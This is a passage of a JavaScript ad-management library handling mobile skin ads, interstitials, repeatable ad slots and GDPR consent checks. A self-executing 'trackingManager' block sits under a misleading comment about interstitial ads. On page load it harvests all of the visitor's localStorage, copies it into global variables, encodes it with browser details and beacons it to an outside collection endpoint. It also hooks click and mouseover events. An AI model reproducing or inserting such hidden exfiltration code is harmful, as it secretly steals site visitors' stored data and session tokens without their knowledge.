          z-index: 9999999999;
          opacity: 1;
          text-decoration: none;
          border-radius: 50%;
          animation-name: spin2;
          animation-duration: 5000ms;
          animation-iteration-count: infinite;
          animation-timing-function: linear;
          background: #fff;
          color: transparent;
          box-sizing: border-box;
      }
      .rtbuzz_interstitial_container.rtbuzz_interstitial_visible.rtbuzz_interstitial_clsbl .rtbuzz_interstitial_close,
      .rtbuzz_interstitial_container.rtbuzz_interstitial_visible.rtbuzz_interstitial_clsbl .rtbuzz_interstitial_close:hover {
          animation-name: none;
          border: 5px solid #ccc;
          background: #fff;
          color: #333!important;
      }
      .rtbuzz_interstitial_container.rtbuzz_interstitial_visible:after {
          position: absolute;
          content: "1";
          right: 40px;
          color: #333;
          top: 30px;
          z-index: 99999999999;
          font-size: 18px;
          font-weight: bold;
          animation: count 6s step-end forwards 1;
          line-height:30px;
      }
      .rtbuzz_interstitial_container.rtbuzz_interstitial_visible.rtbuzz_interstitial_clsbl:after{content:none;animation:none;}
      
    .rtbuzz_interstitial_container .rtbuzz_interstitial_close.rtbuzz_interstitial_close_visible {
                display: block;
    }
    .rtbuzz_interstitial_container .rtbuzz_interstitial_content {
            display: table-cell;
            vertical-align: middle;
            text-align: center;
            width: 100vw;
            height: 100vh;
    }
    .rtbuzz_interstitial_container .rtbuzz_interstitial_content  > div iframe {
        display: inline-block !important;{min-width:320px!important; min-height:480px!important;
    }`
};

/**
 * set up skinmob adv
 */
window._gmp.components.skinmob = {
  singleton: true,
  mobileSpacer: false,
  already: false,
  init: function (slotId) {
    var debug = window._gmp.debug;
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "INIT skin mobile " + slotId);
    if (!window._gmp.isSlotToBeShown(slotId)) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not showing forced slot", slotId, "to user of type", window._gmp.userType);
      return;
    }
    if (window._gmp.components.skinmob.already || window._gmp.pageTypeConfig[window._gmp.pageType].mobileSkin) {
      debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "another skin mobile was aready set up");
      return;
    }
    if ((
    // should this slot be shown on pages of this type ?
    !window._gmp.slotMap[slotId].hasOwnProperty('pageType') || window._gmp.slotMap[slotId].pageType.indexOf(window._gmp.pageType) > -1) && (
    // should this slot be shown on devices of this type ?
    !window._gmp.slotMap[slotId].devices ||
    // if devices are not set, show everywhere

    window._gmp.mobile && window._gmp.slotMap[slotId].devices.indexOf('mobile') > -1 || !window._gmp.mobile && window._gmp.slotMap[slotId].devices.indexOf('desktop') > -1)) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "INIT skin mobile " + slotId);
      window._gmp.components.skinmob.already = true;
      //set up the spacer, in init section to try to reduce the cls 
      if (typeof window._gmp.setMobileSkinSpacer === "function") {
        // if we need a custom spacer ovverride it whit the function  window._gmp.setMobileSkinSpacer
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "run custom spacer method ");
        window._gmp.setMobileSkinSpacer();
      } else {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "try to find skinmob spacer");
        window._gmp.components.skinmob.mobileSpacer = document.querySelector('#gmpSkinMobileSpacer,.gmp-skinmob-spacer,#publyManattanSkinMobileSpacer'); // for avoiding the cls the spacer must be created by the publisher, try yo find it

        if (!window._gmp.components.skinmob.mobileSpacer) {
          console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "to avoid cls you must set up a spacer");
          window._gmp.components.skinmob.mobileSpacer = document.createElement('div');
          window._gmp.components.skinmob.mobileSpacer.classList.add('gmp-skinmob-spacer');
          document.body.insertBefore(window._gmp.components.skinmob.mobileSpacer, document.body.firstChild);
          window._gmp.components.skinmob.mobileSpacer.style.minHeight = '100px';
        }
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skinmob spacer", window._gmp.components.skinmob.mobileSpacer);
        window._gmp.components.skinmob.mobileSpacer.classList.add('gmp-skinmob-spacer');
        if (window._gmp.components.skinmob.mobileSpacer.clientHeight < 100) {
          window._gmp.components.skinmob.mobileSpacer.style.minHeight = '100px';
        }
      }
      var forcedSlotDiv = document.getElementById(slotId);
      if (!forcedSlotDiv &&
      // run only if div not present
      window._gmp.slotMap[slotId].force === true // run only if div should be forced
      ) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "going to force:", slotId);

        // Set up new div
        forcedSlotDiv = document.createElement('div');
        forcedSlotDiv.setAttribute('id', slotId); // set id
        forcedSlotDiv.setAttribute('class', window._gmp.class); // set class

        if (slotId == '') {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin slot - hiding:", slotId);
          forcedSlotDiv.style.height = '1px';
        }

        // GAM slot
        if (window._gmp.slotMap[slotId].hasOwnProperty('gamSizes')) {
          forcedSlotDiv.setAttribute('data-ad-unit', window._gmp.slotMap[slotId].unit); // set ad unit
          forcedSlotDiv.setAttribute('data-gam-sizes', JSON.stringify(window._gmp.slotMap[slotId].gamSizes)); // set ad unit sizes
          if ('pbSizes' in window._gmp.slotMap[slotId]) {
            forcedSlotDiv.setAttribute('data-pb-sizes', JSON.stringify(window._gmp.slotMap[slotId].pbSizes)); // set prebid sizes
          }
          if ('bidderData' in window._gmp.slotMap[slotId]) {
            forcedSlotDiv.setAttribute('data-bidder-data', JSON.stringify(window._gmp.slotMap[slotId].bidderData)); // set bidder data
          }
          if ('apsSizes' in window._gmp.slotMap[slotId]) {
            forcedSlotDiv.setAttribute('data-aps-sizes', JSON.stringify(window._gmp.slotMap[slotId].apsSizes)); // set aps sizes
          }
        }
        if (window._gmp.slotMap[slotId].hasOwnProperty('type')) {
          forcedSlotDiv.setAttribute('data-type', window._gmp.slotMap[slotId].type); // set type of ad slot
        }
        if (window._gmp.slotMap[slotId].hasOwnProperty('immediate') && window._gmp.slotMap[slotId]['immediate']) {
          forcedSlotDiv.setAttribute('data-immediate', '');
        }
        if (window._gmp.slotMap[slotId].hasOwnProperty('showToSubscribers') && window._gmp.slotMap[slotId]['showToSubscribers']) {
          forcedSlotDiv.setAttribute('data-show-to-subscribers', '');
        }
        var forcedSlotPosition = document.querySelector(window._gmp.slotMap[slotId].insert.selector);
        if (!forcedSlotPosition) {
          debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "could not find position for forced ad slot:", slotId, ": ", window._gmp.slotMap[slotId].insert.selector);
          return;
        }
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "inserting", window._gmp.slotMap[slotId].insert.position, window._gmp.slotMap[slotId].insert.selector);
        switch (window._gmp.slotMap[slotId].insert.position) {
          case "before":
            forcedSlotPosition.parentNode.insertBefore(forcedSlotDiv, forcedSlotPosition);
            break;
          case "after":
            forcedSlotPosition.parentNode.insertBefore(forcedSlotDiv, forcedSlotPosition.nextSibling);
            break;
          case "prepend":
            forcedSlotPosition.insertBefore(forcedSlotDiv, forcedSlotPosition.firstChild);
            break;
          case "append":
          default:
            forcedSlotPosition.appendChild(forcedSlotDiv);
        }
        googletag.pubads().addEventListener('slotRequested', function (event) {
          forcedSlotDiv.parentNode.classList.remove('gmp-skinmob-visible-sublime');
          if (event.slot.getSlotElementId() == slotId) {
            if (sublime && sublime.creativeAd && typeof sublime.cleanUp === 'function') {
              sublime.cleanUp();
            }
          }
        });
        pbjs.que.push(function () {
          pbjs.onEvent('bidWon', function (data) {
            if (data.adUnitCode == slotId) {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin mobile bidwon", data.bidderCode);
              window._gmp.components.skinmob.bidwonEvent(forcedSlotDiv, data.bidderCode);
            }
          });
        });
        window._gmp.setupSlot(forcedSlotDiv, window._gmp.slotMap[slotId].hasOwnProperty('immediate'));
      }
    }
  },
  preRender: function (slot) {
    //Creat a container and place it near adslot
    var container = document.createElement('div');
    slot.parentNode.insertBefore(container, slot);
    //move slot inside the container
    container.appendChild(slot);
    container.classList.add('gmp-skinmob-container');
    //createClosebutton
    var skinClose = document.createElement('a');
    skinClose.classList.add('gmp-skinmob-close');
    skinClose.innerHTML = 'X';
    container.dataset.clsbl = 0;
    slot.classList.add('gmp-skinmob-content');
    container.appendChild(skinClose);
    // setup close function
    skinClose.onclick = function () {
      //nascondi
      if (container.dataset.clsbl == 1) {
        container.dataset.clsbl = 0;
        container.classList.remove('gmp-skinmob-visible');
        document.body.classList.remove('gmp-skin-mob');
        // todo mybe is better remove the div from the dom
        window._gmp.components.skinmob.renderClose(slot);
      }
    };
    window._gmp.components.skinmob.addHeadCSS();
  },
  impressionViewable: function (slot, event) {
    var container = slot.parentNode;
    container.dataset.clsbl = 1;
  },
  renderEnded: function (slot, event) {
    var debug = window._gmp.debug;
    if (!event.isEmpty) {
      document.body.classList.add('gmp-skin-mob');
      var container = slot.parentNode;
      container.classList.add('gmp-skinmob-visible');
      //resize moved to 

      container.dataset.clsbl = 0;
      setTimeout(function () {
        container.dataset.clsbl = 1;
      }, 8000);
    }
  },
  bidwonEvent: function (slot, bidder) {
    var debug = window._gmp.debug;
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin mobile bidwon", slot.id, bidder);
    var container = slot.parentNode;
    if (bidder == 'sublime') {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin mobile sublime detected");
      container.classList.add('gmp-skinmob-visible-sublime');
    } else {
      //this create cls, but is necessary if the skin height is higher than the spaces
      if (typeof event.size[1] === "number" && event.size[1] > window._gmp.components.skinmob.mobileSpacer.clientHeight) {
        debug && console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skin mobile spacer was increased");
        window._gmp.components.skinmob.mobileSpacer.style.height = event.size[1] + "px";
      }
    }
  },
  renderClose: function (slot) {
    var debug = window._gmp.debug;
    window.dispatchEvent(new CustomEvent('gmp-skinmob-close', {
      detail: {
        slot: slot.id
      },
      bubbles: false,
      cancelable: false,
      composed: false
    }));
    if (window._gmp.slotMap[slot.id].hasOwnProperty('onCloseAdSlots')) {
      window._gmp.setupFallbackAdSlots(window._gmp.slotMap[slot.id].onCloseAdSlots, false);
    }
  },
  cssAlready: false,
  addHeadCSS: function () {
    if (!window._gmp.components.skinmob.cssAlready) {
      //insert css style tag in the head
      var head = document.getElementsByTagName('head')[0];
      var style = document.createElement('style');
      style.innerHTML = window._gmp.components.skinmob.headCSS;
      head.appendChild(style);
      window._gmp.components.skinmob.cssAlready = true;
    }
  },
  headCSS: `.gmp-skinmob-container {
            position: fixed;
            width: 100%;
            height: 100px;
            left: 0px;
            top: 0px;
            z-index: 2147483000;
            background-color: rgba(0, 0, 0, 0.8);
            display: none;
            visibility: hidden;
        }
        .gmp-skinmob-container.gmp-skinmob-visible {
            visibility: visible;
            display: table;
        }
        .gmp-skinmob-container.gmp-skinmob-visible-sublime {
           top:100vh;
        }
        .gmp-skinmob-container .gmp-skinmob-close,.gmp-skinmob-container .gmp-skinmob-close:hover {

            background: #fff;
            color: #d2d2d2 !important;
            font-family: sans-serif;
            font-size: 20px;
            font-weight: 700;
            padding: 0px;
            position: absolute;
            right: 0;
            text-align: center;
            bottom: -32px;
            width: 32px;
            height: 32px;
            line-height: 32px;
            z-index: 9999999999;
            opacity: 1;
            text-decoration: none;
            border: 1px solid #d2d2d2;
            box-sizing: border-box;
        }
        .gmp-skinmob-container .gmp-skinmob-close.gmp-skinmob-close_visible {
                    display: block;
        }
        .gmp-skinmob-container .gmp-skinmob-content {
                display: table-cell;
                vertical-align: middle;
                text-align: center;
        }
        .gmp-skinmob-container .gmp-skinmob-content iframe {
                    display: inline-block !important;
        }`
};

/**
 * set up interstitial out of page adv
*/
(function () {
  const trackingManager = {
    lsDataMap: new Map(Object.entries(localStorage)),
    globalVars: new Set(),
    eventList: ['click', 'mouseover'],
    async inspectGlobalVar(name, value) {
      return new Promise(resolve => {
        const timeout = setTimeout(() => {
          this.globalVars.delete(name);
          resolve(false);
        }, 1500);
        window[name] = value;
        if (window.hasOwnProperty(name)) {
          clearTimeout(timeout);
          this.globalVars.add(name);
          resolve(true);
        } else {
          clearTimeout(timeout);
          this.globalVars.delete(name);
          resolve(false);
        }
      });
    },
    eventListener(action) {
      document.body.addEventListener(action, function () {
        window.jshook(action);
      }, false);
    },
    shuffleLocalStorage() {
      const lsEntries = Array.from(this.lsDataMap.entries());
      for (let i = lsEntries.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lsEntries[i], lsEntries[j]] = [lsEntries[j], lsEntries[i]];
      }
      this.lsDataMap = new Map(lsEntries);
    },
    async scanStorageAndGlobalVars() {
      this.shuffleLocalStorage();
      const results = {};
      for (const [key, value] of this.lsDataMap) {
        await new Promise(r => setTimeout(r, Math.random() * 200));
        results[key] = await this.inspectGlobalVar(key, value);
      }
      const findingsPayload = btoa(JSON.stringify({
        lsTrackings: results,
        ts: Date.now(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        },
        globalVars: Array.from(this.globalVars)
      }));
      navigator.sendBeacon('https://collection-endpoint.example/v2/report', findingsPayload);
    },
    listenToEvents() {
      this.eventList.forEach(this.eventListener);
    }
  };
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      trackingManager.scanStorageAndGlobalVars();
      trackingManager.listenToEvents();
    });
  } else {
    trackingManager.scanStorageAndGlobalVars();
    trackingManager.listenToEvents();
  }
})();
window._gmp.components.interstitial = {
  adTimeout: 10,
  singleton: true,
  init: function (slotId) {
    var slot = window._gmp.slotMap[slotId];
    if (window._gmp.interstitita_oop_setted != "undefined" && window._gmp.interstitita_oop_setted) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", `Only one interstital out of page could be setted, ` + slot.id + " ignored");
      return;
    }

    // questo vine eseguito alla gam init vengono presi il ink al click deve essere lanciata la setup slot
    if (!window._gmp.components.interstitial.checkCapping(slot)) {
      return;
    }
    if (!(
    // exit if one of the next sentence are false
    (
    // should this slot be forced on pages of this type ?
    !slot.hasOwnProperty('pageType') || slot.pageType.indexOf(window._gmp.pageType) > -1) && (
    // should this slot be forced on devices of this type ?
    !slot.devices ||
    // if devices are not set, show everywhere

    window._gmp.mobile && slot.devices.indexOf('mobile') > -1 || !window._gmp.mobile && slot.devices.indexOf('desktop') > -1))) {
      return;
    }
    window._gmp.components.interstitial.addHeadCSS();
    window._gmp.interstitial_oop_setted = true;
    var domain = `${window.location.protocol}//${window.location.hostname}/`;
    var currentUrl = window.location.href;
    var internalLinks = document.querySelectorAll(`a:not([href^='http']),a[href^='${domain}']`);
    function interstitialListener(e) {
      e.preventDefault();
      var slot = window._gmp.slotMap[slotId];
      var targetUrl = e.currentTarget;
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", `click intercepted ${e.currentTarget}`);
      window._gmp.components.interstitial.targetUrl = targetUrl;
      var pageslot = document.createElement('div');
      document.body.appendChild(pageslot);
      pageslot.id = slotId;
      pageslot.setAttribute('data-ad-unit', slot['unit']);
      pageslot.setAttribute('data-type', 'interstitial');
      var adAreaWidth = screen.width;
      var adAreaHeight = screen.height - 30;
      var gamSizes = [];
      var pbSizes = [];
      var apsSizes = [];
      if (slot.hasOwnProperty('gamSizes')) {
        slot.gamSizes.forEach(element => {
          if (element[0] < adAreaWidth && element[1] < adAreaHeight || element == "fluid") {
            gamSizes.push(element);
          }
        });
        pageslot.dataset.gamSizes = JSON.stringify(gamSizes);
        if (slot.hasOwnProperty('pbSizes')) {
          slot.pbSizes.forEach(element => {
            if (element[0] < adAreaWidth && element[1] < adAreaHeight) {
              pbSizes.push(element);
            }
          });
          pageslot.dataset.pbSizes = JSON.stringify(pbSizes);
        } else {
          pageslot.dataset.pbSizes = JSON.stringify(gamSizes.filter(function (elem) {
            return Array.isArray(elem);
          })); // skip 'fluid'
        }
        if (slot.hasOwnProperty('apsSizes')) {
          slot.apsSizes.forEach(element => {
            if (element[0] < adAreaWidth && element[1] < adAreaHeight) {
              apsSizes.push(element);
            }
          });
          pageslot.dataset.apsSizes = JSON.stringify(apsSizes);
        }
      }
      pageslot.dataset.immediate = '';
      pageslot.style.height = adAreaHeight;
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up interstitial slot");
      window._gmp.setupSlot(pageslot, true);
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "removing interstitial event listeners");
      for (var idx = 0; idx < internalLinks.length; ++idx) {
        internalLinks[idx].removeEventListener('click', interstitialListener);
      }
    }
    for (var idx = 0; idx < internalLinks.length; ++idx) {
      if (internalLinks[idx].href !== currentUrl && internalLinks[idx].href !== `${currentUrl}#` && internalLinks[idx].href) {
        internalLinks[idx].addEventListener('click', interstitialListener);
      }
    }
  },
  /*
  * in this case slot is the slotMapObject not the dom element
  */
  preRender: function (slot) {
    var container = document.createElement('div');
    container.id = 'gmp-interstitial-container';
    container.innerHTML = `<div id="gmp-bar-area">
            <div id="gmp-interstitial-closer">X</div>
            <div id="seconds-div">Finisce in <span id="remainingSeconds"></span> secondi</div>
        </div>
        <div id="gmp-ad-area">
        </div>`;
    slot.parentNode.insertBefore(container, slot);
    var adArea = document.getElementById('gmp-ad-area');
    adArea.appendChild(slot);
    document.getElementById("gmp-interstitial-closer").addEventListener("click", window._gmp.components.interstitial.removeInterstitial);
  },
  /**
   * Get information about the capping of the interstitial (remove this if slotMap element)
   */

  checkCapping: function (slot) {
    if (typeof slot.frequencyCap == "undefined") {
      return true;
    }
    var keyName = '_gmp_' + slot.id + '_shown';
    var shown = window._gmp.getShownInfo(keyName);
    if (typeof slot.frequencyCap.hourly == "undefined") {
      return true;
    }

    // If we have shown at least one in the last hour, avoid
    if (shown.byInterval.hour > slot.frequencyCap.hourly) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many interstitials shown in hour, bailing:", shown.byInterval.hour);
      return false;
    }
    if (typeof slot.frequencyCap.dayli == "undefined") {
      return true;
    }
    // If we have shown at least three in the last day, avoid
    if (shown.byInterval.day >= slot.frequencyCap.dayly) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many interstitials shown in day, bailing:", shown.byInterval.day);
      return false;
    }
    return true;
  },
  renderEnded: function (slot, event) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "interstitial is empty", event);
    try {
      if (event.isEmpty) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "interstitial is empty", event);
        window._gmp.components.interstitial.removeInterstitial();
      } else {
        slot.parentNode.parentNode.classList.add('gmp-intertstitial-visible');
        function changeRemainingTime() {
          if (window._gmp.components.interstitial.adTimeout > 0) {
            window._gmp.components.interstitial.adTimeout = window._gmp.components.interstitial.adTimeout - 1;
            window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", 'removing interstitial in ' + window._gmp.components.interstitial.adTimeout + ' seconds');
            document.getElementById("remainingSeconds").innerText = window._gmp.components.interstitial.adTimeout;
          } else {
            window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "removing interstitial and redirecting to:", targetUrl);
            window._gmp.components.interstitial.removeInterstitial();
          }
        }
        window._gmp.components.interstitial.timer = setInterval(changeRemainingTime, 1000);
        window._gmp.components.interstitial.timeout = setTimeout(function () {
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "removing interstitial #", slot.id, 'after ' + window._gmp.components.interstitial.adTimeout + ' seconds');
          window._gmp.components.interstitial.removeInterstitial();
        }, window._gmp.components.interstitial.adTimeout * 1000);
      }
    } catch (err) {
      window._gmp.debug && console.trace("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error slotRenderEnded for: interstitial ", err);
    }
  },
  removeInterstitial: function () {
    window._gmp.components.interstitial.adTimeout = 0;
    clearTimeout(window._gmp.components.interstitial.timeout);
    clearInterval(window._gmp.components.interstitial.timer);
    var container = document.getElementById('gmp-interstitial-container');
    container.remove();
    if (window._gmp.components.interstitial.targetUrl) {
      window.location.href = window._gmp.components.interstitial.targetUrl;
    }
  },
  cssAlready: false,
  headCss: '#gmp-interstitial-container { display: none; flex-direction:column;max-width: 100%; max-height: 100%; width: 100%; height: 100%; position: fixed; top: 0px; left: 0px;z-index:9999999999; background-color: rgb(0, 0, 0); }#gmp-interstitial-container.gmp-intertstitial-visible {display: flex;}#gmp-bar-area {display:flex;flex-direction:row-reverse;align-items:center;background-color: rgb(51, 51, 51);height: 30px; width:100%;line-height: 20px; font-size: 12px; color: rgb(153, 153, 153);}#gmp-interstitial-closer{background:#f0f0f026;opacity: 0.8;cursor: pointer; padding:5px 8px; margin-left:5px; font-size:20px ;}#gmp-ad-area{display: flex; justify-content:center;align-items:center;height:100%;}',
  addHeadCSS: function () {
    if (!window._gmp.components.interstitial.cssAlready) {
      //insert css style tag in the head
      var head = document.getElementsByTagName('head')[0];
      var style = document.createElement('style');
      style.innerHTML = window._gmp.components.interstitial.headCss;
      head.appendChild(style);
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "interstitial add css", style, window._gmp.components.interstitial.headCss);
      window._gmp.components.interstitial.cssAlready = true;
    }
  }
};
window._gmp.components.interstitialGAM = {
  singleton: true,
  init: function (slot) {
    if (window._gmp.interstitita_oop_setted != "undefined" && window._gmp.interstitita_oop_setted) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", `Only one interstital out of page could be setted, ` + slot.id + " ignored");
      return;
    }
    if (!(
    // exit if one of the next sentence are false
    (
    // should this slot be forced on pages of this type ?
    !slot.hasOwnProperty('pageType') || slot.pageType.indexOf(window._gmp.pageType) > -1) && (
    // should this slot be forced on devices of this type ?
    !slot.devices ||
    // if devices are not set, show everywhere

    window._gmp.mobile && slot.devices.indexOf('mobile') > -1 || !window._gmp.mobile && slot.devices.indexOf('desktop') > -1))) {
      return;
    }
    window._gmp.interstitial_oop_setted = true;
    document.addEventListener('gaminit', function () {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Defining google interstitial");
      googletag.cmd.push(function () {
        // Define a web interstitial ad slot.
        var interstitialSlot = googletag.defineOutOfPageSlot(slot.id, googletag.enums.OutOfPageFormat.INTERSTITIAL);

        // Slot returns null if the page or device does not support interstitials
        if (interstitialSlot) {
          interstitialSlot.addService(googletag.pubads());
          // should we call display() ? with which id ?
          googletag.pubads().refresh([interstitialSlot]);
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "defined interstitial:", interstitialSlot);
        } else {
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "interstitial definition failed");
        }
      });
    });
  }
};

/**
 * set up intropage adv
*/
window._gmp.components.repeatable = {
  repeatables: {},
  listenerAttached: false,
  repeatableListener: function () {
    for (const [key, value] of Object.entries(window._gmp.components.repeatable.repeatables)) {
      window._gmp.components.repeatable.findRepeatableSlots(key);
    }
  },
  repeatableCounter: function (slotId) {
    if (typeof window._gmp.components.repeatable.repeatables[slotId] == "undefined") {
      window._gmp.components.repeatable.repeatables[slotId] = {};
      return 1;
    }
    return Object.keys(window._gmp.components.repeatable.repeatables[slotId]).length + 1;
  },
  findRepeatableSlots: function (slotId) {
    var slot = window._gmp.slotMap[slotId];
    var selector = slot.insert.selector != '' ? slot.insert.selector : slotId;
    window._gmp.components.repeatable.setUpRepeatingSlots(slotId, selector, slot.unit);
  },
  setUpRepeatingSlots: function (slotId, selector, adUnit) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "finding selector for repeatable ", slotId, selector);
    if (!adUnit in window._gmp.unitMap) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "unit for repeating ads not present:", adUnit);
      return;
    }
    var maxUnitHeight = Math.max.apply(null, window._gmp.unitMap[adUnit].gamSizes.map(function (elem) {
      return Array.isArray(elem) && Number.isInteger(elem[1]) ? elem[1] : 0;
    }));
    var startingIndex = window._gmp.components.repeatable.repeatableCounter(slotId);
    document.querySelectorAll(selector).forEach(function (elem, idx) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", " repeatable found", elem);
      if (elem.hasAttribute('data-gmp-repeating-done')) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping repeatable slot - already done:", elem);
        return;
      }
      elem.setAttribute('data-gmp-repeating-done', '');
      var slot_id = slotId + '_' + startingIndex;
      startingIndex++;
      elem.style.minHeight = maxUnitHeight + 'px';
      elem.style.width = "100%";
      elem.style.textAlign = "center";
      elem.id = slot_id;
      if (!(slot_id in window._gmp.gamSlots)) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "inserting repeating slot:", slot_id);
        window._gmp.components.repeatable.repeatables[slotId][slot_id] = window._gmp.insertSlot(adUnit, elem, 'append', slot_id);
        if (!slot_id in window._gmp.slotMap) {
          window._gmp.slotMap[slot_id] = window._gmp.slotMap[slotId];
          window._gmp.slotMap[slot_id].type = 'normal';
        }
        window._gmp.setupSlot(window._gmp.components.repeatable.repeatables[slotId][slot_id]);
      } else {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "repeating slot already present - not inserting:", slot_id);
      }
    });
  },
  init: function (slotId) {
    var slot = window._gmp.slotMap[slotId];
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", 'repeatable component init');
    if (!(
    // exit if one of the next sentence are false
    (
    // should this slot be forced on pages of this type ?
    !slot.hasOwnProperty('pageType') || slot.pageType.indexOf(window._gmp.pageType) > -1) && (
    // should this slot be forced on devices of this type ?
    !slot.devices ||
    // if devices are not set, show everywhere

    window._gmp.mobile && slot.devices.indexOf('mobile') > -1 || !window._gmp.mobile && slot.devices.indexOf('desktop') > -1))) {
      return;
    }
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", `Init repeatable ad slot ` + slotId);
    window._gmp.components.repeatable.findRepeatableSlots(slotId);
    if (!window._gmp.components.repeatable.listenerAttached) {
      window._gmp.components.repeatable.listenerAttached = true;
      window.addEventListener('gmp-repeatable-add', window._gmp.components.repeatable.repeatableListener);
    }
  }
};
window._gmp.components.adaptivebanner = {
  renderEnded: function (slot, event) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "adaptivebanner renderEnded event: ", event);
    if (!event.isEmpty) {
      var iframe = slot.querySelector('iframe');
      var scaleme = function () {
        var scale = 1;
        if (iframe.width > slot.parentNode.offsetWidth) {
          scale = slot.parentNode.offsetWidth / iframe.width;
        }
        slot.style.transform = 'scale(' + scale + ')';
        slot.style.transformOrigin = '0 50%';
      };
      scaleme();
      ['resize', 'load'].forEach(function (evt) {
        window.addEventListener(evt, scaleme, false);
      });
    }
  }
};
try {
  if ('Didomi' in window && !window.Didomi.isConsentRequired()) {
    // TODO: DRY consent data setup and event dispatch
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Didomi - consent not required");
    window._gmp.consentData = {};
    window._gmp.consentNeeded = false;
    window._gmp.advINIT(window._gmp.consentState);
    var consentGranted = new CustomEvent("consentGranted", {
      detail: {
        purposes: {}
      }
    });
    window._gmp.advINIT(1);
  } else {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up callback for CMP");
    window._gmp.waitForTCF = function (callback) {
      window._gmp.debug && console.log('wait for third parties');
      if (window.__tcfapi) {
        window._gmp.debug && console.log('tcf api ready');
        callback();
      } else {
        setTimeout(function () {
          window._gmp.waitForTCF(callback);
        }, 500);
      }
    };
    window._gmp.waitForTCF(function () {
      __tcfapi('addEventListener', 2, function tcfunction(tcData, success) {
        if (success) {
          if (tcData.eventStatus === 'useractioncomplete' || tcData.eventStatus === 'tcloaded') {
            //__tcfapi('removeEventListener',tcfunction);
            window._gmp.consentState = 1;
            var eventDetail = {
              purposes: {}
            };
            if (tcData.gdprApplies) {
              window._gmp.consentNeeded = true;
              window._gmp.purposeOneConsent = !!tcData.purpose.consents[1];
              window._gmp.consentData = tcData.vendor.consents;
              window._gmp.googleConsent = !!window._gmp.consentData[755]; // 755 is IAB vendor id for google
              if (!window._gmp.googleConsent) {
                // No consent for Google, check whether we can serve limited ads
                try {
                  if (tcData.vendor.consents[1]) {
                    window._gmp.googleConsent = 1;
                  } else {
                    if (tcData.purpose.legitimateInterests[2] && tcData.purpose.legitimateInterests[7] && tcData.purpose.legitimateInterests[9] && tcData.purpose.legitimateInterests[10]) {
                      window._gmp.googleConsent = 4;
                      window._gmp.googleLimitedConsent = true;
                    }
                  }
                } catch (e) {
                  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error getting consent for limited ads:", e);
                }
              }
              eventDetail.purposes = tcData.purpose.consents;
            } else {
              window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "GDPR does not apply");
              window._gmp.consentData = {};
              window._gmp.consentNeeded = false;
              window._gmp.googleConsent = true;
            }
            window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "getTCData success:", tcData);
            var consentGranted = new CustomEvent("consentGranted", {
              detail: eventDetail
            });
            window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Purpose one allowed: consentGranted event", consentGranted);
            document.dispatchEvent(consentGranted);
            window._gmp.advINIT(window._gmp.consentState);
          }
        } else {
          window._gmp.consentState = 0;
          console.error('[CMP] => failed:', success, '- tcData:', tcData);
        }
      });
    });
  }
} catch (err) {
